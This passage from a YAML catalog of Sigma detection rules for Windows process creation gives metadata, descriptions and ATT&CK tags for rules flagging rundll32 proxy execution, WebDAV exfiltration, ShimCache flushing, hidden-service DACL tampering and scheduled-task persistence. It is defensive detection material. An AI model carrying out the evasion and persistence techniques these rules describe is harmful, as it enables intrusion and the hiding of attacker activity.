  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: caa06de8-fdef-4c91-826a-7f9e163eef4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_spawn_explorer.yml
  name: RunDLL32 Spawning Explorer
  description: Detects RunDLL32.exe spawning explorer.exe as child, which is very
    uncommon, often observes Gamarue spawning the explorer.exe process in an unusual
    way
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://redcanary.com/blog/intelligence-insights-november-2021/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e593cf51-88db-4ee1-b920-37e89012a3c9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
  name: Potentially Suspicious Rundll32 Activity
  description: Detects suspicious execution of rundll32, with specific calls to some
    DLLs with known LOLBIN functionalities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - risk_scoring_or_weighting
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/
  - https://twitter.com/Hexacorn/status/885258886428725250
  - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52
  - https://twitter.com/nas_bench/status/1433344116071583746
  - https://twitter.com/eral4m/status/1479106975967240209
  - https://twitter.com/eral4m/status/1479080793003671557
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
  notes: ''
- detection_id: d7eb979b-c2b5-4a6f-a3a7-c87ce6763819
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_susp_control_dll_load.yml
  name: Suspicious Control Panel DLL Load
  description: Detects suspicious Rundll32 execution from control.exe as used by Equation
    Group and Exploit Kits
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://twitter.com/rikvduijn/status/853251879320662017
  - https://twitter.com/felixw3000/status/853354851128025088
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4aa6040b-3f28-44e3-a769-9208e5feb5ec
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_susp_execution_with_image_extension.yml
  name: Suspicious Rundll32 Execution With Image Extension
  description: Detects the execution of Rundll32.exe with DLL files masquerading as
    image files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution
  false_positives:
  - Unknown
  notes: ''
- detection_id: d87bd452-6da1-456e-8155-7dc988157b7d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_susp_shellexec_execution.yml
  name: Suspicious Usage Of ShellExec_RunDLL
  description: Detects suspicious usage of the ShellExec_RunDLL function to launch
    other commands as seen in the the raspberry-robin attack
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/raspberry-robin/
  - https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8823e85d-31d8-473e-b7f4-92da070f0fc6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml
  name: Suspicious ShellExec_RunDLL Call Via Ordinal
  description: 'Detects suspicious call to the "ShellExec_RunDLL" exported function
    of SHELL32.DLL through the ordinal number to launch other commands.

    Adversary might only use the ordinal number in order to bypass existing detection
    that alert on usage of ShellExec_RunDLL on CommandLine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://redcanary.com/blog/raspberry-robin/
  - https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/
  - https://github.com/SigmaHQ/sigma/issues/1009
  - https://strontic.github.io/xcyclopedia/library/shell32.dll-65DA072F25DE83D9F83653E3FEA3644D.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: b0524451-19af-4efa-a46f-562a977f792e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_susp_shimcache_flush.yml
  name: ShimCache Flush
  description: Detects actions that clear the local ShimCache and remove forensic
    evidence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://medium.com/@blueteamops/shimcache-flush-89daff28d15e
  false_positives:
  - Unknown
  notes: ''
- detection_id: 731231b9-0b5d-4219-94dd-abb6959aa7ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_sys.yml
  name: Suspicious Rundll32 Activity Invoking Sys File
  description: Detects suspicious process related to rundll32 based on command line
    that includes a *.sys file as seen being used by UNC2452
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0ea52357-cd59-4340-9981-c46c7e900428
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_udl_exec.yml
  name: Potentially Suspicious Rundll32.EXE Execution of UDL File
  description: 'Detects the execution of rundll32.exe with the oledb32.dll library
    to open a UDL file.

    Threat actors can abuse this technique as a phishing vector to capture authentication
    credentials or other sensitive data.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1071
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.command-and-control
  - attack.t1218.011
  - attack.t1071
  time_window: ''
  references:
  - https://trustedsec.com/blog/oops-i-udld-it-again
  false_positives:
  - UDL files serve as a convenient and flexible tool for managing and testing database
    connections in various development and administrative scenarios.
  notes: ''
- detection_id: 5cdb711b-5740-4fb2-ba88-f7945027afac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_unc_path.yml
  name: Rundll32 UNC Path Execution
  description: Detects rundll32 execution where the DLL is located on a remote location
    (share)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.002
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1218.011
  time_window: ''
  references:
  - https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c3a99af4-35a9-4668-879e-c09aeb4f2bdf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension.yml
  name: Rundll32 Execution With Uncommon DLL Extension
  description: Detects the execution of rundll32 with a command line that doesn't
    contain a common extension
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1481630810495139841?s=12
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3b5b0213-0460-4e3f-8937-3abf98ff7dcc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_user32_dll.yml
  name: Suspicious Workstation Locking via Rundll32
  description: Detects a suspicious call to the user32.dll function that locks the
    user workstation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://app.any.run/tasks/2aef9c63-f944-4763-b3ef-81eee209d128/
  false_positives:
  - Scripts or links on the user desktop used to lock the workstation instead of Windows+L
    or the menu option
  notes: ''
- detection_id: 2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_execution.yml
  name: WebDav Client Execution Via Rundll32.EXE
  description: 'Detects "svchost.exe" spawning "rundll32.exe" with command arguments
    like "C:\windows\system32\davclnt.dll,DavSetCookie".

    This could be an indicator of exfiltration or use of WebDav to launch code (hosted
    on a WebDav server).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.003
  tags:
  - attack.exfiltration
  - attack.t1048.003
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/17
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/7.B.4_C10730EA-6345-4934-AA0F-B0EFCA0C4BA6.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 982e9f2d-1a85-4d5b-aea4-31f5e97c6555
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution.yml
  name: Suspicious WebDav Client Execution Via Rundll32.EXE
  description: 'Detects "svchost.exe" spawning "rundll32.exe" with command arguments
    like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator
    of exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially
    a sign of exploitation of CVE-2023-23397

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.003
  tags:
  - attack.exfiltration
  - attack.t1048.003
  - cve.2023-23397
  time_window: ''
  references:
  - https://twitter.com/aceresponder/status/1636116096506818562
  - https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/
  - https://www.pwndefend.com/2023/03/15/the-long-game-persistent-hash-theft/
  - https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2023/03/Figure-7-sample-webdav-process-create-event.png
  - https://www.microsoft.com/en-us/security/blog/2023/03/24/guidance-for-investigating-attacks-using-cve-2023-23397/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5bb68627-3198-40ca-b458-49f973db8752
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_without_parameters.yml
  name: Rundll32 Execution Without Parameters
  description: Detects rundll32 execution without parameters as observed when running
    Metasploit windows/smb/psexec exploit module
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.002
  - T1569.002
  - T1570
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1570
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://bczyz1.github.io/2021/01/30/psexec.html
  false_positives:
  - False positives may occur if a user called rundll32 from CLI with no options
  notes: ''
- detection_id: 198effb6-6c98-4d0c-9ea3-451fa143c45c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_runonce_execution.yml
  name: Run Once Task Execution as Configured in Registry
  description: This rule detects the execution of Run Once task as configured in the
    registry
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://twitter.com/pabraeken/status/990717080805789697
  - https://lolbas-project.github.io/lolbas/Binaries/Runonce/
  - https://twitter.com/0gtweet/status/1602644163824156672?s=20&t=kuxbUnZPltpvFPZdCrqPXA
  false_positives:
  - Unknown
  notes: ''
- detection_id: d937b75f-a665-4480-88a5-2f20e9f9b22a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_change_sevice_image_path_by_non_admin.yml
  name: Possible Privilege Escalation via Weak Service Permissions
  description: Detection of sc.exe utility spawning by user with Medium integrity
    level to change service ImagePath or FailureCommand
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.011
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment
  - https://pentestlab.blog/2017/03/30/weak-service-permissions/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 85ff530b-261d-48c6-a441-facaa2e81e48
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_create_service.yml
  name: New Service Creation Using Sc.EXE
  description: Detects the creation of a new service using the "sc.exe" utility.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md
  false_positives:
  - Legitimate administrator or user creates a service for legitimate reasons.
  - Software installation
  notes: ''
- detection_id: 85c312b7-f44d-4a51-a024-d671c40b49fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_disable_service.yml
  name: Service StartupType Change Via Sc.EXE
  description: Detect the use of "sc.exe" to change the startup type of a service
    to "disabled" or "demand"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1562.001
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955
  false_positives:
  - False positives may occur with troubleshooting scripts
  notes: ''
- detection_id: 431a1fdb-4799-4f3b-91c3-a683b003fc49
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_new_kernel_driver.yml
  name: New Kernel Driver Via SC.EXE
  description: Detects creation of a new service (kernel driver) with the type "kernel"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/
  false_positives:
  - Rare legitimate installation of kernel drivers via sc.exe
  notes: ''
- detection_id: e83e8899-c9b2-483b-b355-5decc942b959
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_query_interesting_services.yml
  name: Interesting Service Enumeration Via Sc.EXE
  description: 'Detects the enumeration and query of interesting and in some cases
    sensitive services on the system via "sc.exe".

    Attackers often try to enumerate the services currently running on a system in
    order to find different attack vectors.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.t1003
  - attack.credential-access
  time_window: ''
  references:
  - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
  - https://pentestlab.blog/tag/svchost/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6c8fbee5-dee8-49bc-851d-c3142d02aa47
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_sdset_allow_service_changes.yml
  name: Allow Service Access Using Security Descriptor Tampering Via Sc.EXE
  description: Detects suspicious DACL modifications to allow access to a service
    from a suspicious trustee. This can be used to override access restrictions set
    by previous ACLs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1543.003
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1628720819537936386
  - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/
  - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings
  false_positives:
  - Unknown
  notes: ''
- detection_id: 99cf1e02-00fb-4c0d-8375-563f978dfd37
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_sdset_deny_service_access.yml
  name: Deny Service Access Using Security Descriptor Tampering Via Sc.EXE
  description: Detects suspicious DACL modifications to deny access to a service that
    affects critical trustees. This can be used to hide services or make them unstoppable.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1543.003
  time_window: ''
  references:
  - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/
  - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/
  - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings
  false_positives:
  - Unknown
  notes: ''
- detection_id: a537cfc3-4297-4789-92b5-345bfd845ad0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_sdset_hide_sevices.yml
  name: Service DACL Abuse To Hide Services Via Sc.EXE
  description: Detects usage of the "sc.exe" utility adding a new service with special
    permission seen used by threat actors which makes the service hidden and unremovable.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.011
  time_window: ''
  references:
  - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html
  - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/
  - https://twitter.com/Alh4zr3d/status/1580925761996828672
  - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 98c5aeef-32d5-492f-b174-64a691896d25
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_sdset_modification.yml
  name: Service Security Descriptor Tampering Via Sc.EXE
  description: Detection of sc.exe utility adding a new service with special permission
    which hides that service.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.011
  time_window: ''
  references:
  - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html
  - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/
  - https://twitter.com/Alh4zr3d/status/1580925761996828672
  - https://twitter.com/0gtweet/status/1628720819537936386
  - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 138d3531-8793-4f50-a2cd-f291b2863d78
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_service_path_modification.yml
  name: Suspicious Service Path Modification
  description: Detects service path modification via the "sc" binary to a suspicious
    command or path
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md
  - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 38879043-7e1e-47a9-8d46-6bec88e201df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_service_tamper_for_persistence.yml
  name: Potential Persistence Attempt Via Existing Service Tampering
  description: Detects the modification of an existing service in order to execute
    an arbitrary payload when the service is started or killed as a potential method
    for persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  - T1574.011
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1543.003
  - attack.t1574.011
  time_window: ''
  references:
  - https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 81bcb81b-5b1f-474b-b373-52c871aaa7b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sc_stop_service.yml
  name: Stop Windows Service Via Sc.EXE
  description: Detects the stopping of a Windows service via the "sc.exe" utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.impact
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742107(v=ws.11)
  false_positives:
  - There are many legitimate reasons to stop a service. This rule isn't looking for
    any suspicious behavior in particular. Filter legitimate activity accordingly
  notes: ''
- detection_id: c5c00f49-b3f9-45a6-997e-cfdecc6e1967
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_appdata_local_system.yml
  name: Suspicious Schtasks Execution AppData Folder
  description: Detects the creation of a schtask that executes a file from C:\Users\<USER>\AppData\Local
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1059.001
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.t1059.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1c0e41cd-21bb-4433-9acc-4a2cd6367b9b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_change.yml
  name: Suspicious Modification Of Scheduled Tasks
  description: 'Detects when an attacker tries to modify an already existing scheduled
    tasks to run from a suspicious location

    Attackers can create a simple looking task in order to avoid detection on creation
    as it''s often the most focused on

    Instead they modify the task after creation to include their malicious payload

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1053.005
  time_window: ''
  references:
  - Internal Research
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks
  false_positives:
  - Unknown
  notes: ''
- detection_id: 92626ddd-662c-49e3-ac59-f6535f12d189
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml
  name: Scheduled Task Creation Via Schtasks.EXE
  description: Detects the creation of scheduled tasks by user accounts via the "schtasks"
    utility.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1053.005
  - attack.s0111
  - car.2013-08-001
  - stp.1u
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create
  false_positives:
  - Administrative activity
  - Software installation
  notes: ''
- detection_id: 39019a4e-317f-4ce3-ae63-309a8c6b53c5
  source_id: sigmahq_sigma
